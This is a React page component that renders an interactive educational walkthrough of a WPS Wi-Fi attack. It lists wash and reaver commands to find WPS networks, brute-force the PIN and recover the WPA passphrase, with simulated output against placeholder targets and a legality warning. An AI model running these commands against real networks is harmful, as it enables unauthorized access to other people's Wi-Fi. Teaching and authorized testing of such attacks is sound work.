import React, { useState } from 'react';
import Meta from '../components/SEO/Meta';

interface Step {
  title: string;
  command: string;
  output: string;
}

const steps: Step[] = [
  {
    title: 'Discover WPS-enabled networks',
    command: 'wash -i wlan0mon',
    output: `BSSID              Channel  RSSI  WPS Version  WPS Locked  ESSID
00:11:22:33:44:55  6        -40   1.0          No          ExampleAP`,
  },
  {
    title: 'Brute-force the WPS PIN',
    command: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -vv',
    output: `[#] Waiting for beacon from 00:11:22:33:44:55
[+] Associated with 00:11:22:33:44:55 (ESSID: ExampleAP)
[+] Pin cracked in 312 seconds
[+] WPS PIN: 12345670`,
  },
  {
    title: 'Retrieve WPA passphrase',
    command: 'reaver -i wlan0mon -b 00:11:22:33:44:55 -K',
    output: `[+] WPS PIN: 12345670
[+] WPA PSK: "examplepassword"
[+] AP SSID: "ExampleAP"`,
  },
  {
    title: 'Use credentials to connect',
    command: 'wpa_supplicant -i wlan0 -c wpa.conf',
    output: `Successfully initialized wpa_supplicant
Connection established to ExampleAP`,
  },
];

const WpsAttack = () => {
  const [current, setCurrent] = useState(0);
  const step = steps[current];

  return (
    <>
      <Meta />
      <main className="bg-ub-cool-grey text-white min-h-screen p-4">
        <h1 className="text-2xl mb-4">WPS Attack Walkthrough</h1>
        <ol className="space-y-4">
          {steps.map((s, idx) => (
            <li
              key={s.title}
              className={`p-4 rounded border ${
                idx === current ? 'bg-black border-green-400' : 'bg-ub-grey border-gray-600'
              }`}
            >
              <div className="font-bold">{`Step ${idx + 1}: ${s.title}`}</div>
              {idx === current && (
                <pre className="bg-ub-black text-green-400 p-2 mt-2 text-sm overflow-auto whitespace-pre-wrap">
{`$ ${s.command}
${s.output}`}
                </pre>
              )}
            </li>
          ))}
        </ol>
        <div className="flex justify-between mt-4">
          <button
            className="px-4 py-2 bg-gray-700 rounded disabled:opacity-50"
            onClick={() => setCurrent((c) => Math.max(c - 1, 0))}
            disabled={current === 0}
          >
            Previous
          </button>
          <button
            className="px-4 py-2 bg-ub-green text-black rounded disabled:opacity-50"
            onClick={() => setCurrent((c) => Math.min(c + 1, steps.length - 1))}
            disabled={current === steps.length - 1}
          >
            Next
          </button>
        </div>
        <p className="text-xs text-red-400 mt-6">
          Warning: This walkthrough is for educational purposes only. Unauthorized network access is illegal and unethical. Always obtain permission before testing security.
        </p>
      </main>
    </>
  );
};

export default WpsAttack;

